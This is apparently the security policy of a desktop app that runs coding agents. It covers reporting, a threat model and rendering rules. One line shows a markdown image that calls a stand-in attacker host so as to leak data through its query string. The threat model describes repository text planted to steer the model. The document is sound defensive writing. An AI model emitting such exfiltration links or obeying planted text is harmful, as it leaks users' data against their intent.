# Security

## Reporting a vulnerability

Open a [security advisory][advisories] rather than a public issue. If you would
rather not use GitHub, an ordinary issue saying only "I have a security report"
with no detail is fine, and contact can move from there.

[advisories]: https://github.com/c-wenlong/artemis/security/advisories/new

## The threat model

Artemis runs coding agents on your machine and renders what they produce. Two
things follow from that, and most of the security work here is about them.

**Model output is untrusted input.** It arrives from a harness that relays
whatever the model wrote, and the model has just read a repository that may
itself contain text planted to be read. Anything the renderer does with that
string is done on behalf of whoever planted it.

**Agents are given real capability on purpose.** They edit files and run
commands, because that is the product. Artemis does not try to sandbox them; it
tries to make what they did legible and reversible.

## What is enforced

| Surface | Rule | Where |
|---|---|---|
| Rendered markdown | Embedded HTML renders as text; `rehype-raw` is deliberately absent | `Markdown.tsx` |
| Links in output | `javascript:` and `data:` URLs are stripped | react-markdown default |
| Images in output | Described, never fetched — see below | `Markdown.tsx` |
| Webview | CSP: `default-src 'self'`, no object, no framing, connect limited to Tauri IPC | `tauri.conf.json` |
| Subprocesses | Always an argv array; no shell string is ever built | `proc.rs`, `pty.rs`, `adapters.rs` |
| Model-supplied paths | Absolute paths and `..` refused before any filesystem access | `paths.rs` |
| Patches | Header paths rebuilt from a vetted relative path; `git apply --check` first | `git.rs` |
| Quiver's files | Read-only, always | `quiver.rs` |
| Network | The host makes no outbound requests. Artemis does not phone home | — |

Each has a test. The path and patch rules are exercised against real git
repositories, because they are the ones that can destroy work.

### Why images are not loaded

`![](https://attacker.example/p.png?leak=…)` in an answer would fetch the moment
the transcript painted — no click, no warning — and anything the model had just
read could ride out in that query string. An image reference is shown with its
alt text and URL, and nothing is requested. Reference-style syntax is covered
too; it is the form that slips past a naive fix.

## Known accepted findings

**`cargo audit`: 0 vulnerabilities** across 449 crates. 17 warnings, all
transitive through Tauri and all accepted: 16 unmaintained (`atk`, `gdk`, `gtk`
and friends — the GTK3 bindings Tauri uses for the Linux webview — plus the
`unic-*` family) and 1 unsound (`glib` `VariantStrIter`). None is reachable from
Artemis's own code; they resolve when Tauri moves to GTK4.

**`pnpm audit`: 9 advisories, all dev-only.** Every one is in the
`vitest → vite → postcss/esbuild/nanoid` chain. None ships in the app. The
"critical" one concerns the Vitest UI server, which this project does not run.

## History

**Not yet clean.** Commits from before the 2026-08-11 audit contain the author's
home directory, real project names, and two student identifiers that were in the
Quiver fixture before it was neutralised.

Nothing in history is a credential — every blob in every commit was scanned for
private keys and provider tokens, and there were none. What remains is personal
data, and a git history is permanent once published.

`scripts/scrub-history.sh` removes it. The rewrite is verified read-only against
all 573 reachable blobs: 14 findings before, none after. The script backs up the
branch first, refuses to continue if the current tree changes, reports any
commit `--prune-empty` dropped, re-runs the scan afterwards, and does not push
unless asked.

The strings it removes are **not in this repository**. They live in
`scripts/scrub-tokens.txt`, which is gitignored;
[scrub-tokens.example](scripts/scrub-tokens.example) documents the format. A
scrubber that has to be read to be trusted cannot also be the last published
copy of what it removes.

Three things the first version of this got wrong, all found by testing it:

- **The backup branch was rewritten too.** `filter-branch -- --all` rewrites
  every ref, including the backup made moments earlier, so the printed recovery
  command would have restored the *scrubbed* history. Only the current branch is
  rewritten now.
- **A committed `.pyc` carried everything.** Compiled Python embeds the string
  constants of the module it was built from — at the time, the whole token list.
  Being binary, it was skipped by the scrubber *and* by the verification pass:
  the scrub would have reported a clean history and left the data in a blob. The
  verification now reads binary blobs, the filter deletes bytecode outright, and
  `no_compiled_bytecode_is_tracked` stops it coming back.
- **The repository audit was failing.** Two checks in `tests/repo.rs` had gone
  red when the token list was committed, and were not noticed.

**Run it before making this repository public** — and note that a force-push
does not remove the old commits from GitHub. They stay fetchable by SHA until
GitHub garbage-collects. Ask GitHub support to GC the repository, or push the
rewritten history to a freshly created one. The script cleans your history; only
that step cleans the remote's.

## What is not protected against

- **A malicious harness binary.** If the agent on your `PATH` is hostile,
  Artemis runs it. There is no sandbox.
- **Prompt injection changing what an agent does.** Artemis makes the result
  visible and reversible; it does not prevent it.
- **Anything after you click Run.** The agent's own permissions are the agent's
  to enforce.
